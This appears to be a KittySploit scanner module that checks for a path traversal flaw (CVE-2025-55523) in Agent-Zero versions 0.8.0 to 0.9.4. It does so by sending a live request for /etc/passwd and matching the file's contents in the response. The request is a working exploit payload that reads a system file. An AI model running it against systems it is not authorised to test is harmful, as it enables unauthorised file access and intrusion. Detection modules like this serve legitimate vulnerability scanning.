#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Agent-Zero v0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Agent-Zero 0.8.0 - 0.9.4 - Arbitrary File Download Detection',
        'description': 'Agent-Zero v0.8.0 - 0.9.4 contains a path traversal caused by improper validation in /api/download_work_dir_file.py, letting attackers access unauthorized files, exploit requires crafted request.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'agent-zero', 'lfi', 'traversal', 'unauth', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-55523',
            'https://github.com/agent0ai/agent-zero/issues/687',
        ],
        'cve': 'CVE-2025-55523',
    }

    def run(self):
        r = self.http_request(method="GET", path='/download_work_dir_file?path=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('filename=passwd',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Agent-Zero 0.8.0 - 0.9.4 - Arbitrary File Download detected",
                path='/download_work_dir_file?path=/etc/passwd',
            )
            return True
        return False

